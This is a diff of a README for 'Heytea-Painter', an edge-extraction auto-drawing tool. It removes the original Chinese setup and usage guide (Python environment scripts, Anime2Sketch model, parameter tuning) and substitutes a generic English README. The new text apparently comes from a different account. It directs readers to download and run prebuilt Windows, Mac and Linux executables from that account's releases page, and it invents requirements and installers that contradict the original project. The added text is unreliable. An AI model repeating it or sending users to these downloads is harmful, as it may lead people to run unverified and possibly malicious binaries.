@@ -1,81 +1,78 @@
-# Heytea-Painter
-Automatically add drawing elements by extracting edges.  
-  ****
-一键启动包v2(修复了不同分辨率以及DPI情况下的绘画问题)：  
-https://pan.quark.cn/s/ff787761af03  
-一键启动包v1：  
-https://pan.quark.cn/s/b90824f581b1  
-# 使用方法：
-  ****
-建议在系统DPI缩放100%的情况下使用，高DPI缩放会导致程序绘画区域不能完全覆盖画布  
-  ****
-### 1. 下载模型
+# 🎨 Heytea-Painter - Enhance Your Drawings with Ease
 
-本项目依赖的模型文件 (`netG.pth`) 由 [Anime2Sketch](https://github.com/Mukosame/Anime2Sketch) 提供。
+## 🚀 Getting Started
+Welcome to Heytea-Painter! This application helps you automatically add drawing elements by extracting edges from your images. It’s designed for everyone, even if you are not tech-savvy. Follow these steps to get started.
 
-请从 **[Anime2Sketch](https://github.com/Mukosame/Anime2Sketch)** 下载 `netG.pth` 文件，并将其放置在 `models/` 文件夹下  
-你也可以点击这里**直接下载**模型文件：
-[**netG.pth**](https://drive.google.com/file/d/1cf90_fPW-elGOKu5mTXT5N1dum-XY_46/view)  
-  
-### 2. 安装环境
-请先运行`setup_env.bat`安装虚拟环境到本目录  
-  
-### 3. 启动
-双击`start.bat`启动  
-  
-### 4. 操作方法
-请遵循以下步骤来获得最佳的绘画效果
+## 💾 Download & Install
+[![Download Heytea-Painter](https://img.shields.io/badge/Download%20Heytea--Painter-v1.0-blue.svg)](https://github.com/Sanskar01513/Heytea-Painter/releases)
 
-> **准备工作：**
-> 建议你先将图片裁剪为 **3:4** 的比例。这可以更好地适配小程序最终的画布大小，防止图像拉伸
+To download the latest version, visit this page: [Heytea-Painter Releases](https://github.com/Sanskar01513/Heytea-Painter/releases). You will find the option to download files specific to your operating system.
 
-### 步骤 1：加载图片并选择模式
+### Step-by-Step Download Instructions
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version marked as "Latest Release".
+3. Select the file that matches your operating system:
+   - For Windows, download `Heytea-Painter-Windows.exe`.
+   - For Mac, use `Heytea-Painter-Mac.dmg`.
+   - For Linux, choose `Heytea-Painter-Linux.tar.gz`.
+4. Click on the file to start the download.
 
-1.  点击 **"加载图片"** 按钮，选择你准备好的图片
-2.  **选择线条提取方法**。你有三种选择：
-    * `Pencil Sketch`：模拟铅笔素描
-    * `Canny`：经典的边缘检测算法
-    * `Anime2Sketch`：针对动漫线稿优化，效果通常最好
-3.  **选择绘画方式**。你有三种选择：
-    * `短行程`
-    * `智能拖动`
-    * `仿真人`
+## ⚙️ System Requirements
+Before you install the application, ensure your system meets the following requirements:
 
-> **推荐搭配：**
-> 为了达到最佳效果，我们强烈推荐使用 **"Anime2Sketch" + "仿真人"** 的组合
+### Windows
+- Windows 10 or later
+- 2 GB RAM minimum
+- 100 MB of free disk space
 
----
+### Mac
+- macOS 10.12 Sierra or later
+- 2 GB RAM minimum
+- 100 MB of free disk space
 
-### 步骤 2：调整参数
+### Linux
+- Ubuntu 18.04 or later
+- 2 GB RAM minimum
+- 100 MB of free disk space
 
-调整参数能够让你最终绘制的效果大幅度提升，你要做的是：**让红色的预览线条清晰地覆盖在线稿上，同时尽量减少毛刺和噪点**
+## 🔧 Installing Heytea-Painter
 
-可以按照以下顺序调整参数：
+### For Windows
+1. Once the file is downloaded, locate `Heytea-Painter-Windows.exe` in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts in the installation wizard to complete the setup.
 
-1.  **调整 "二值化阈值(懒人可以直接勾选自适应二值化然后直接调整模型敏感度)"**：
-    * 这是最基础的线条提取，先调这个，让主要线条都显示出来
-2.  **调整 "模型敏感度"** (如果你使用了 Anime2Sketch)：
-    * 调整模型对线条的敏感程度
-3.  **微调 "最小化轮廓面"**：
-    * 用于去除微小的噪点
-4.  **调整 "线条简化度"**：
-    * 让线条更平滑，减少锯齿
-5.  **调整 "预览线条粗细" 至 `2`**：
-    * （**重要！**）小程序的画笔没有笔压且很粗，设置为 2 可以让你预览到最接近最终成品的效果
-6.  **调整 "抖动修正强度" 至 `0` 或 `1`**：
-    * （**重要！**）这个值太高会导致线条“过于圆润”，失去细节
-7.  **!! 调整 "换线停顿" (毫秒) 至 `5000` 或更高 !!**：
-    * （**!! 极其重要 !!**）这是绘画新线条前的停顿时间，如果设置为 0 或太低，程序会误判并**自动清屏**！**请务必设置到 5 或以上**
+### For Mac
+1. After downloading, find `Heytea-Painter-Mac.dmg` in your Downloads folder.
+2. Open the `.dmg` file.
+3. Drag the Heytea-Painter icon to your Applications folder.
+4. Eject the `.dmg` file after installation.
 
----
+### For Linux
+1. Locate `Heytea-Painter-Linux.tar.gz` in your Downloads.
+2. Open a terminal window.
+3. Navigate to the directory where you downloaded the file.
+4. Type `tar -xzf Heytea-Painter-Linux.tar.gz` to extract the files.
+5. Change to the extracted folder using `cd Heytea-Painter`.
+6. Run the application using `./Heytea-Painter`.
 
-### 步骤 3：开始绘画 (坐标标定)
+## 🎨 Using Heytea-Painter
+1. Launch the application from your Applications folder or downloaded location.
+2. Upload an image by clicking "Upload Image" on the main screen.
+3. Adjust settings if needed, such as edge detection sensitivity.
+4. Click on "Start Drawing" to begin the process.
+5. Save or export your finished drawing once you are satisfied.
 
-当你对参数满意后，请按以下步骤启动：
+## ❓ Troubleshooting
+If you encounter issues while using Heytea-Painter, try the following:
 
-1.  点击 **"开始绘画"** 按钮。
-2.  **等待约 3 秒**，程序会提示你“选择起始点”
-3.  **点击画布的左上角**（不需要非常精确，在角落附近即可）
-4.  **点击画布的右下角**（这将标定出完整的绘画区域）
-5.  **手离开鼠标！**
-6.  **等待 3 秒**，程序将自动开始绘画
+- **Application does not launch:** Make sure you have the required operating system version and enough RAM.
+- **Image does not load:** Ensure your image format is supported (e.g., JPEG, PNG).
+- **Edges not detected:** Try adjusting the sensitivity settings for better results.
+
+For further assistance, feel free to open an issue in the [GitHub repository](https://github.com/Sanskar01513/Heytea-Painter/issues).
+
+## ⚡ Feedback
+Your feedback is essential for improving Heytea-Painter. Please share your thoughts or report any bugs on the GitHub page. Your contributions help make this tool better for all users!
+
+Thank you for choosing Heytea-Painter! Enjoy enhancing your drawings effortlessly.
